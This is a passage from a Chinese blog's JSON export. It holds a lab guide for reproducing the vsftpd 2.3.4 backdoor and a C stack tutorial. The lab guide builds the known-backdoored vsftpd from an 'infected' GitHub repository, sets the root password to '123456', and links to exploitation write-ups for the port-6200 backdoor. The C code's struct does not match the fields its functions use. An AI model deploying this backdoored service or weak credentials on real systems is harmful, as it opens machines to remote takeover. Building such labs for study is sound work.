2.3.4](https://0ffff7f000001ipv6literalnet.wordpress.com/2012/06/26/trace-down-the-backdoor-in-vsftpd-2-3-4/)。在github上找到了有后门的版本。RUN git clone https://github.com/nikdubois/vsftpd-2.3.4-infected \\ &amp;&amp; cd /vsftpd-2.3.4-infected \\ &amp;&amp; sed -i -e &#x27;s|#define VSF_SYSDEP_HAVE_LIBCAP|//&amp;|&#x27; sysdeputil.c \\ &amp;&amp; cp Makefile Makefile.bak \\ &amp;&amp; sed &#x27;s/vsf_findlibs.sh`/&amp; -lcrypt/&#x27; Makefile.bak &gt; Makefile \\ &amp;&amp; makeRUN mkdir /usr/local/man/man8 \\ &amp;&amp; mkdir /usr/local/man/man5 \\ &amp;&amp; cd /vsftpd-2.3.4-infected \\ &amp;&amp; make install \\ &amp;&amp; cp vsftpd.conf /etc/vsftpd.conf.bak \\ &amp;&amp; sed &#x27;$a\\secure_chroot_dir=/opt/usr/share/empty&#x27; /etc/vsftpd.conf.bak &gt; /etc/vsftpd.conf.bak2 \\ &amp;&amp; mkdir -p /opt/usr/share/empty \\ &amp;&amp; sed &#x27;s/#local_enable=YES/local_enable=YES/&#x27; /etc/vsftpd.conf.bak2 &gt; /etc/vsftpd.conf 创建用户并更改密码。1234567RUN touch input.data RUN echo &quot;123456&quot; &gt; input.data RUN echo &quot;123456&quot; &gt;&gt; input.data RUN passwd root &lt; input.dataRUN echo &quot;123456&quot; &gt; input.data RUN echo &quot;123456&quot; &gt;&gt; input.data RUN adduser test &lt; input.data 最后只要进入容器执行vsftpd命令，就可以启动服务了。 0x02 使用docker镜像配置漏洞环境 使用镜像配置环境非常简单，但是现有的vsftpd-2.3.4的镜像是基于alpine linux的，和ubuntu差别较大，经常遇到一些问题。 找到了一个已经安装好了vsftpd-2.3.4的镜像。,还找到了对应的Dockerfile 拉取镜像： 1docker pull penkit/vsftpd:2.3.4 启动镜像 1docker run -it --rm -p 21:21 penkit/vsftpd:2.3.4 &quot;vsftpd /etc/vsftpd/vsftpd.conf&quot; 启动vsftpd 1vsftpd /etc/vsftpd/vsftpd.conf 0x03 使用metasploitable2镜像配置这种方法网上教程应该很多，我自己并没有尝试，所以不详细介绍。 0x03 利用笑脸漏洞手工利用https://blog.csdn.net/qq_34122419/article/details/82957510 metasploithttps://www.whj.website/blog/2018/09/13/Vsftpd2.3.4%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/ 注意：在一次攻击结束后，马上进行第二次攻击，会失败。原因是之前的ftp连接和6200端口连接没有关闭。只要等到超时自动关闭就可以了。 Reference vsftpd-2.3.4源码安装教程 VSFTPD V2.3.4后门分析","raw":null,"content":null,"categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://yoursite.com/tags/docker/"}]},{"title":"C语言实现栈.md","slug":"算法/C语言实现栈","date":"2018-10-21T03:20:42.000Z","updated":"2020-02-02T12:23:40.410Z","comments":true,"path":"2018/10/21/算法/C语言实现栈/","link":"","permalink":"http://yoursite.com/2018/10/21/%E7%AE%97%E6%B3%95/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E6%A0%88/","excerpt":"","text":"C语言实现栈为什么要使用栈？栈的特点是先进后出，可以用于保存之前的状态，比如调用子函数，还有迷宫问题中保存路径。 栈需要用的数据结构？定义栈 1234typedef struct stack&#123; pNode top; // 栈顶 pNode bottom; // 栈底 &#125;Stack, *pStack; 定义结点 1234typedef struct node&#123; int data; //数据可以根据自己的需要定制 struct node * pNext; //指向下一个结点的指针&#125;Node, *pNode; 栈需要实现的一些操作初始化栈（申请底结点，并初始化数据和top、bottom指针） 1234567891011121314void initStack(pStack ps)&#123; ps-&gt;top = (pNode)malloc(sizeof(Node)); if(NULL == ps-&gt;top)&#123; printf(&quot;分配内存失败\\n&quot;); exit(-1); &#125;else&#123; ps-&gt;top-&gt;pos_x = 0; ps-&gt;top-&gt;pos_y = 0; ps-&gt;top-&gt;direction = &#x27;#&#x27;; ps-&gt;bottom = ps-&gt;top; ps-&gt;bottom-&gt;pNext = NULL; &#125; return;&#125; 出栈（检查栈是否为空，如果不为空，让top指针指向下一个结点，然后释放之前的头结点的内存） 1234567891011bool pop(pStack ps)&#123; if(ps-&gt;top == ps-&gt;bottom)&#123; return false; &#125;else&#123; pNode tempNodePointer; tempNodePointer = ps-&gt;top; ps-&gt;top = ps-&gt;top-&gt;pNext; free(tempNodePointer); return true; &#125;&#125; 入栈（申请一个结点，设置好data和指针，然后将结点连到栈链表上） 12345678910111213bool push(pStack ps, int pos_x, int pos_y, char dir)&#123; pNode newNode = (pNode)malloc(sizeof(Node)); if(NULL == newNode)&#123; return false; &#125;else&#123; newNode-&gt;pos_x = pos_x; newNode-&gt;pos_y = pos_y; newNode-&gt;direction = dir; newNode-&gt;pNext = ps-&gt;top; ps-&gt;top = newNode; &#125; return true;&#125; 遍历栈（从头结点开始） 1234567void traverse(pStack ps)&#123; pNode temp = ps-&gt;top; while(temp != ps-&gt;bottom)&#123; printf(&quot;%c&quot;, temp-&gt;direction); temp = temp-&gt;pNext; &#125;&#125; 遍历栈（从底结点开始，用递归的方法，如果没有到底结点，不断调用自身，如果到了底结点，就返回） 1234567void traverse2(pNode temp, pNode bottom)&#123; if(temp != bottom)&#123; traverse2(temp-&gt;pNext, bottom); &#125; printf(&quot;%c&quot;, temp-&gt;direction); return;&#125;","raw":null,"content":null,"categories":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]}]}